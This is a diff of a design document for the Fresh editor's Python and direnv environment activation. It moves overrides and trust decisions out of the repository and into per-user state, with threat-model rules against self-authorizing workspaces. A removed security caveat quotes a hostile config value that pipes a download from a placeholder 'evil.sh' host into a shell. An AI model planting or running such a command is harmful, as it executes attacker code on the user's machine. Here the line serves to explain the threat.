@@ -57,9 +57,13 @@ anchors:
   registered via `editor.registerStatusBarElement(token, title)` and updated
   via `editor.setStatusBarValue(bufferId, token, value)` (see
   `plugins/git_statusbar.ts`).
-- **Project-local config** — `$PROJECT_ROOT/.fresh/config.json`
-  (`config_io.rs:283`), a layer in the precedence chain
-  system → **project** → user → session. The version-controllable escape hatch.
+- **Per-workspace user state** — `getGlobalState`/`setGlobalState`, keyed by the
+  canonicalized workspace path. Stored in the user's config dir, never in the
+  repo. This is where the trust decision and any per-user override live (the
+  devcontainer plugin uses the same store for its per-workspace attach
+  decisions). Fresh *also* has a committed project-config layer
+  (`$PROJECT_ROOT/.fresh/config.json`, `config_io.rs:283`), but this feature
+  deliberately does **not** use it — see §Tier 3.
 - **Pickers & prompts** — `editor.startPrompt` + `editor.setPromptSuggestions`
   (the buffer switcher and every devcontainer picker), and `showActionPopup`
   for modal allow/deny choices.
@@ -108,11 +112,14 @@ authority.
 ## The UX: three tiers of control (auto → glance → explicit)
 
 The entire UX is a ladder from zero-effort to total control. A user never *has*
-to open config, but can always override any layer.
+to configure anything, but can always override the behavior — and every override
+lives in the user's own config, never in the repository.
 
-### Tier 1 — Auto-detect (zero config, the default)
+### Tier 1 — Auto-detect from the ecosystem's own files (zero config, the default)
 
-On opening a workspace, scan the root for, in priority order:
+Fresh is a pure *consumer* of the standard, editor-agnostic files a project
+already commits — it adds none of its own. On opening a workspace, scan the root
+for, in priority order:
 
 - `.venv/bin/activate`, `venv/bin/activate`
 - `.envrc` (direnv)
@@ -168,40 +175,45 @@ Selecting an entry rebuilds the Authority with that env snapshot (the existing
 the environment. This is the TUI equivalent of VS Code's "click the interpreter
 in the status bar" quick-pick.
 
-### Tier 3 — Explicit, version-controllable config (full control)
+### Tier 3 — Per-user overrides, stored outside the repo (full control)
 
-The JetBrains-style escape hatch, in `.fresh/config.json` (project layer), so a
-team shares it via git:
+A user can override, enable, or disable the auto-detect behavior — but the
+override lives in **user-global state, never in the repository.** Fresh is not a
+widely used editor; committing a Fresh-specific config file (`.vscode`-style)
+would land an obscure artifact in the tree that teammates on other editors read
+as garbage. More importantly, the *what environment to use* answer is already
+committed in editor-agnostic form (§Tier 1) — Fresh has nothing project-specific
+worth adding to git.
+
+So overrides are stored via `setGlobalState`, keyed by the **canonicalized
+workspace path** (the same store the devcontainer plugin uses for its
+per-workspace decisions, and the same store that holds the trust decision):
 
 ```jsonc
+// conceptual shape of the per-workspace record in user-global state
 {
-  "env": {
-    "provider": "direnv",                     // direnv | mise | venv | command | none | auto
-    "interpreter": "./.venv/bin/python",      // pins the interpreter the picker shows
-    "activate": "source .venv/bin/activate",  // free-form wrapper command
-    "autoActivate": true,                     // skip the allow prompt for THIS workspace
-    "applyToTerminal": true                   // inject env into integrated terminals too
-  }
+  "enabled": true,                 // master switch for this workspace
+  "provider": "direnv",            // pin a provider, or "none" to force system
+  "interpreter": "/abs/.venv/bin/python", // manual interpreter override
+  "activate": "source .venv/bin/activate", // hand-typed wrapper (rare escape hatch)
+  "applyToTerminal": true
 }
 ```
 
-`activate` is the prompt's "Environment Initialization Script / Wrapper
-Command" field: Fresh runs it in a subshell, captures the resulting `env`, and
-injects the delta. Any explicit key wins over auto-detect, and the picker shows
-the configured choice as active. Because config is layered, a user can override
-a committed project default in their user config or per-session.
+Plus a **global default** (in the user's config, not per-workspace) to turn the
+whole feature on or off, or set it to "ask, never auto." Reached through the
+picker's "Edit activation command…" / "Use system / none" entries and the
+`Env: …` command-palette commands — the user never hand-edits a file unless they
+want to.
 
-> **Security caveat — `.fresh/config.json` is attacker-controlled.** The
-> project config layer ships *inside the repository*. A malicious project can
-> commit `{ "env": { "activate": "curl evil.sh | sh", "autoActivate": true } }`.
-> Therefore the execution-triggering `env.*` keys (`activate`, `provider`,
-> `autoActivate`) are **only honored from the project layer in a trusted
-> workspace**. From an untrusted workspace they are parsed but inert:
-> `autoActivate` cannot grant itself trust, and `activate` will not run until
-> the user trusts the workspace. Keys that only affect display
-> (`interpreter` shown in the picker) are safe to read untrusted. This is the
-> general rule in §Threat model: *no setting that originates from the workspace
-> may, by its own assertion, authorize code execution.*
+What this trades away: a team **cannot** share a *Fresh-specific* override
+through git. In practice that override is almost always expressible in the
+standard files anyway — pin the version in `.tool-versions`, point `.envrc` at
+the venv, set `[tool.poetry]` in `pyproject.toml` — so the loss is small and the
+repo stays clean. If a real demand for committed Fresh overrides ever appears,
+it can be added later as an explicit, opt-in "save to project" action; it is
+deliberately **not** a default, and the threat-model rules below would then
+apply to it.
 
 ## The login-shell baseline fix (two real gaps in Fresh today)
 
@@ -255,7 +267,9 @@ boundary — never on the open-folder path:
 
 - **`.envrc`** (direnv) — arbitrary shell, by design.
 - **`mise.toml` / `.mise.toml`** — env, tasks, and hooks can run commands.
-- **`activate`** wrapper from project config — arbitrary shell.
+- **`activate`** wrapper (the hand-typed escape hatch in user state) — arbitrary
+  shell. Note this one is *user-authored*, not repo-supplied, so the risk is the
+  user's own typo rather than a hostile project — but it still executes.
 - **`venv`/`poetry` activation** — `bin/activate` is shell; and more subtly,
   `./.venv/bin/python` (or `ruff`, `pyright`) is a **repo-controlled binary**.
   Prepending `./.venv/bin` to `PATH` means *every subsequent spawn* — LSP,
@@ -308,10 +322,14 @@ direnv: .envrc found in this project. Loading it runs the project's shell code.
 1. **No autorun from open-folder.** Activation never happens as a side effect of
    opening a file or directory, only from explicit user action or
    pre-existing persisted trust for that exact canonical path.
-2. **Workspace-sourced config cannot self-authorize.** `autoActivate: true` in
-   the repo's `.fresh/config.json` is ignored unless the workspace is already
-   trusted by the user (§Tier 3 caveat). Trust flows from the user, never from
-   the repository.
+2. **Trust and overrides never come from the repository.** All persisted state —
+   the trust decision, the provider/interpreter override, the `enabled` switch —
+   lives in user-global state keyed by canonical path (§Tier 3), so the repo
+   cannot vouch for itself or pre-set an override. Dropping the committed
+   project-config layer for this feature removes the self-authorization vector
+   entirely (a malicious repo has no Fresh file to plant `autoActivate: true`
+   in). The only thing read from the repo is the *standard* ecosystem files,
+   and reading them is passive; running them needs trust.
 3. **Surface the `PATH` risk.** When activation prepends a repo-local `bin/`,
    the info panel states plainly that subsequent tools resolve from inside the
    project, so a user auditing an untrusted repo understands the consequence.
@@ -366,8 +384,9 @@ workflows.
    local venv, so it ships in the first increment.
 2. **direnv / mise providers.** Add `direnv export json` / `mise env --json`
    and the `Reload` command, reusing the phase-1 trust gate. Still local.
-3. **Project config (`env.*`) + info panel + diagnostics.** Tier 3 control and
-   the visible-failure path.
+3. **Per-user overrides + info panel + diagnostics.** Tier 3 overrides
+   (enable/disable, pin provider/interpreter) in user-global state, plus the
+   visible-failure path.
 4. **SSH core fixes.** SSH-routed `long_running_spawner` + env injection in
    `Authority::ssh`; the remote login-shell capture in the plugin. This is what
    makes remote Pyright/`ruff` resolve against a remote venv/mise toolchain.
